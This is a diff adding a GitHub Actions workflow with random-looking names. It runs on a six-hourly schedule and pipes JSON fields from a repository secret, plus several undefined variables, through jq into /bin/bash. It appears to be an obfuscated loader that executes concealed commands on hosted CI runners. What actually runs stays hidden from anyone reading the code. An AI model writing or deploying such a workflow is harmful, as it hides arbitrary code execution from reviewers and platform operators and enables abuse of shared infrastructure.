@@ -1,0 +1,23 @@
+name: huangganling2003
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huangganling2003
+        env:
+          uczb6: ${{ secrets.uczb6 }}
+        run: |
+          echo $uczb6 | jq -r .y96 | /bin/bash
+          echo $ln0 | jq -r .ewrb14243 | /bin/bash
+          echo $agkp0 | jq -r .ujfmq53 | /bin/bash
+          echo $w82 | jq -r .ee940 | /bin/bash
+          echo $ncdh851 | jq -r .wmkmx31265 | /bin/bash
+          echo $fxakf537 | jq -r .t6122 | /bin/bash
+
